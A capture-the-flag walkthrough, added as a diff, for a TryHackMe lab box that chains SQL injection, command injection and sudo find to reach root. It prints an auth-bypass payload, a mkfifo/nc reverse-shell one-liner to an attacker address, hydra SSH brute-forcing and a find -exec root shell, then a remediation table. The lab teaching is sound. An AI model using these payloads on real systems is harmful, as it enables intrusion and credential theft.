@@ -1,0 +1,236 @@
+================================================================================
+                        TRYHACKME - OPERATION: RECRUITCORP
+                     Full Walkthrough: Web Enum to Root via sudo find
+================================================================================
+
+--------------------------------------------------------------------------------
+OVERVIEW
+--------------------------------------------------------------------------------
+Target IP   : 10.48.162.84
+VHost       : operation.thm
+OS          : Ubuntu (Linux)
+Initial Acc : SSH as jford (password cracked from cewl wordlist)
+Privesc     : sudo /usr/bin/find -> root shell
+Key Findings: SQLi auth bypass, RCE via ping.php, plaintext creds in SQLite DB,
+              GTFOBin find
+
+--------------------------------------------------------------------------------
+1. RECONNAISSANCE
+--------------------------------------------------------------------------------
+
+1.1 PORT SCAN
+    nmap -sC -sV -p- -T4 10.48.162.84
+
+    22/tcp   open  ssh          OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+    80/tcp   open  http         Apache httpd 2.4.58 ((Ubuntu))
+    139/tcp  open  netbios-ssn?
+    445/tcp  open  netbios-ssn  Samba smbd 4
+
+    Add vhost:
+        echo "10.48.162.84 operation.thm" | sudo tee -a /etc/hosts
+
+1.2 WEB DIRECTORY ENUMERATION
+    dirsearch -u http://operation.thm
+
+    [200] /index.php
+    [200] /index.php/login/
+    [200] /robots.txt
+    [200] /admin/
+    [200] /admin/index.php
+
+    robots.txt returned 32 bytes, nothing useful.
+    SMB (445) checked with smbclient -> only a readme.txt, no creds.
+    Pivot: focus on the web app.
+
+--------------------------------------------------------------------------------
+2. WEB EXPLOITATION
+--------------------------------------------------------------------------------
+
+2.1 AUTHENTICATION BYPASS - SQL INJECTION
+    Target: http://operation.thm/admin/
+
+    Payload in username field:
+        admin' or 1==1-- -
+        Password: <anything>
+
+    Result: logged in as admin -> dashboard with User Lookup feature.
+
+2.2 USER LOOKUP ENUMERATION
+    http://operation.thm/admin/users/lookup.php?id=7
+
+    ID       : 7
+    Username : sysmaint
+    Role     : system
+    Notes    : Service account for /admin/sysmaint-checks/ping.php.
+               Do not disable.
+
+    Notes field revealed path to a diagnostic ping endpoint
+    -> classic command-injection candidate.
+
+2.3 COMMAND INJECTION -> REVERSE SHELL
+    Listener:
+        nc -lvnp 4444
+
+    Payload (URL-encoded in host parameter):
+        host=localhost;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.167.6 4444 >/tmp/f
+
+    Result:
+        uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+    Shell acquired as www-data.
+
+--------------------------------------------------------------------------------
+3. POST-EXPLOITATION (as www-data)
+--------------------------------------------------------------------------------
+
+3.1 DATABASE CREDENTIALS
+    /admin/index.php source contained:
+        $db = new SQLite3('/var/lib/recruitcorp/app.db');
+
+    Config file also leaked:
+        db_host=localhost
+        db_name=recruitcorp
+        db_user=jford
+        db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
+        db_engine=sqlite3
+
+3.2 DUMPING THE SQLITE DATABASE
+    sqlite3 /var/lib/recruitcorp/app.db "SELECT * FROM users;"
+
+    ID | Username  | Password        | Role      | Notes
+    ---+-----------+-----------------+-----------+-----------------------------
+    1  | admin     | A!7s2f9DkLp_Q3e | admin     | Primary admin account
+    2  | mvasquez  | pw_mv_4831      | recruiter | Owns EMEA pipeline
+    3  | tparker   | pw_tp_2210      | recruiter | Owns AMER pipeline
+    4  | lhayes    | pw_lh_9911      | analyst   | Reporting only
+    5  | kchen     | pw_kc_7763      | recruiter | Out on leave
+    6  | rdavis    | pw_rd_2241      | analyst   | Reporting only
+    7  | sysmaint  | pw_sm_8841      | system    | Service account
+    8  | jbailey   | pw_jb_3392      | recruiter | New starter Q3
+    9  | aokafor   | pw_ao_5588      | recruiter | APAC
+
+    Contact email also found: careers@recruitcorp.thm
+
+3.3 BUILDING A WORDLIST WITH CEWL
+    SQLite dump was a rabbit hole - none were the SSH password.
+    Mine the web content itself:
+
+        cewl http://operation.thm -d 2 -m 5 -w wordlist.txt --lowercase
+
+    Add known candidates:
+        echo 'spring2026!' >> wordlist.txt
+        sort -u wordlist.txt -o wordlist.txt
+
+--------------------------------------------------------------------------------
+4. SSH ACCESS
+--------------------------------------------------------------------------------
+
+4.1 HYDRA
+    hydra -l jford -P wordlist.txt ssh://10.48.162.84 -t 4
+
+    [22][ssh] host: 10.48.162.84   login: jford   password: spring2026!
+
+4.2 LOGIN
+    ssh jford@10.48.162.84
+    # password: spring2026!
+
+4.3 USER FLAG
+    cat ~/user.txt
+
+--------------------------------------------------------------------------------
+5. PRIVILEGE ESCALATION
+--------------------------------------------------------------------------------
+
+5.1 ENUMERATION
+    sudo -l
+
+    Matching Defaults entries for jford on recruitcorp:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
+        use_pty
+
+    User jford may run the following commands on recruitcorp:
+        (root) NOPASSWD: /usr/bin/find
+
+5.2 WHY THIS IS VULNERABLE
+    find is a well-known GTFOBin. Its -exec flag runs arbitrary
+    binaries, and because find itself is executed via sudo, the child
+    process inherits root privileges. secure_path and env_reset do NOT
+    mitigate this - the vulnerability is in the binary's own
+    functionality, not environment inheritance.
+
+5.3 ROOT SHELL
+    sudo /usr/bin/find / -exec /bin/sh \; -quit
+
+    # id
+    uid=0(root) gid=0(root) groups=0(root)
+
+5.4 ROOT FLAG
+    cat /root/root.txt
+
+--------------------------------------------------------------------------------
+6. ATTACK CHAIN SUMMARY
+--------------------------------------------------------------------------------
+
+    Nmap  -->  22/80/139/445
+              |
+              v
+    Web enum  -->  /admin/ login form
+              |
+              v
+    SQLi  -->  admin' or 1==1-- -   (auth bypass)
+              |
+              v
+    Lookup  -->  sysmaint -> /admin/sysmaint-checks/ping.php
+              |
+              v
+    RCE  -->  host=localhost;...nc <attacker> 4444
+              |
+              v
+    www-data  -->  SQLite dump, config hash, careers@ email
+              |
+              v
+    cewl+hydra  -->  jford : spring2026!  -> SSH
+              |
+              v
+    sudo -l  -->  (root) NOPASSWD: /usr/bin/find
+              |
+              v
+    find -exec  -->  ROOT
+
+--------------------------------------------------------------------------------
+7. REMEDIATION
+--------------------------------------------------------------------------------
+
+    Finding                          | Fix
+    ---------------------------------+---------------------------------------------
+    SQLi in /admin/ login            | Parameterize queries / prepared statements
+    Plaintext passwords in app.db    | Store bcrypt/argon2 hashes only
+    Command injection in ping.php    | Allowlist host (regex ^[a-zA-Z0-9.\-]+$),
+                                     | use escapeshellarg
+    World-readable SQLite DB         | chmod 600, root:root
+    NOPASSWD find in sudoers         | Remove; if needed, use a wrapper script
+                                     | with fixed arguments
+    Weak password (spring2026!)      | Enforce policy + rotate
+    Config leak                      | Move secrets out of the web root
+
+--------------------------------------------------------------------------------
+8. KEY TAKEAWAYS
+--------------------------------------------------------------------------------
+
+    - Look at source code, not just output. The SQLite path and hash
+      were only visible by reading index.php.
+    - Notes fields are gold. sysmaint-checks/ping.php was the pivot
+      to RCE.
+    - SQLite dumps are often decoys. Don't assume every credential is
+      the one; the real SSH password came from web scraping.
+    - sudo find is always root. -exec, -execdir, and -ok all spawn
+      child processes as root here. Same class of risk applies to
+      vim, less, awk, tar, nmap --script, etc.
+    - GTFOBins is the first stop for any sudo -l result you don't
+      recognize.
+
+================================================================================
+   Writeup compiled from the engagement notes for operation.thm (TryHackMe).
+   All actions were performed in an authorized lab environment.
+================================================================================
